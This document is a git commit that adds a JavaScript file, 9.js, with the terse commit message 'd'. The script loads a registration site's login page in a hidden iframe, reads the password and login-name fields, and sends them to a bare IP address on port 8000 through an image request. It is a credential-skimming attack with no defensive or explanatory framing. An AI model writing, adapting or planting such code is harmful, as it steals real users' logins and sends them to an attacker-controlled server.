0ad8cee58b6eee1cf2a41618edbabb72c1cd66f0
speakerwild11 <59812396+speakerwild11@users.noreply.github.com>
2024-09-23 14:17:44 -0400

    d

---
+++ 9.js
@@ -0,0 +1,21 @@
+const frimfram = document.createElement('iframe'); 
+frimfram.src = 'https://registration.cesa5.org/np/logout.do';
+frimfram.id = 'frimfram';
+var frimframdoc;
+var pw;
+var un;
+var imag;
+function frimframlistener(){
+	try{
+		frimframdoc = document.getElementById('frimfram').contentWindow.document;
+		pw = frimframdoc.querySelector('#password').value;
+		un = frimframdoc.querySelector('#loginName').value;
+		imag = document.createElement('img');
+		imag.src = 'http://74.14.159.250:8000/?pwd=' + pw + "&usr=" + un;
+		document.body.appendChild(imag);
+	}catch(error){
+		console.error(error);
+	}
+}
+frimfram.addEventListener('onload', frimframlistener);
+document.body.appendChild(frimfram);
